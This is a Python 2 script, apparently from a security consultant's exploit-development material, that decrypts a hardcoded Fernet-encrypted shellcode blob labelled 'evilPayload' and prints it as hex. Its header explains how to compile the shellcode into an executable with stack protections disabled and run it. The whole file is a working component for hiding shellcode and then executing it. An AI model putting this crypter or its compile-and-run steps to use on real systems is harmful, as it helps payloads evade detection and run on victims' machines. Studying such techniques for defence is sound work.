#!/usr/bin/python
""" 
Content:	custom decrypter for enrypted evilPayload
Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
Date: 		10/2017

Test:		Insert your encrypted Shellcode in this file, execute it and copy the decrypted shellcode into the shellcode.c file
		'gcc -fno-stack-protector -z execstack shellcode.c -o shellcode' -> ./shellcode -> Boom!
"""
from cryptography.fernet import Fernet
import sys

def to_hex(in_str):
	out = ""
	tmp = ["\\x%02x" % ord(c) for c in in_str]
	for i in range(0, len(in_str),16):
		out = out + '"' + "".join(tmp[i:i+16]) + "\"\n"

	return out

def start():

	cipher_shellHex = ("\x67\x41\x41\x41\x41\x41\x42\x5a\x33\x66\x54\x69\x52\x72\x34\x45"
"\x7a\x36\x5a\x4b\x2d\x41\x4c\x54\x7a\x50\x45\x6f\x72\x5f\x6e\x44"
"\x77\x34\x49\x43\x7a\x36\x4e\x57\x45\x61\x57\x33\x56\x30\x56\x47"
"\x68\x54\x5a\x6d\x52\x50\x43\x78\x6c\x7a\x4c\x37\x44\x33\x4b\x7a"
"\x72\x66\x4b\x41\x4e\x62\x48\x48\x69\x6a\x4a\x77\x66\x68\x32\x63"
"\x38\x61\x70\x4b\x6e\x59\x32\x46\x39\x4e\x63\x39\x47\x4d\x41\x30"
"\x67\x71\x73\x6d\x73\x52\x35\x76\x67\x68\x4e\x57\x31\x50\x59\x52"
"\x50\x7a\x46\x6a\x44\x4d\x72\x67\x68\x47\x46\x5f\x72\x48\x35\x6f"
"\x74\x7a\x67\x4b\x70\x63\x4c\x55\x36\x6c\x51\x41\x2d\x62\x66\x4f"
"\x49\x65\x39\x49\x5a\x70\x44\x72\x72\x66\x41\x64\x6b\x58\x52\x62"
"\x69\x51\x3d\x3d")

	cipher_suite = Fernet("mItQELTYWErF-BdSy7I8d5hY4bSHnY1DTtbDmJg8LHw=")

	plain_text = to_hex(cipher_suite.decrypt(cipher_shellHex))
	print "[+] Decrypted shellcode:"
	print plain_text


if __name__ == "__main__":
	start()
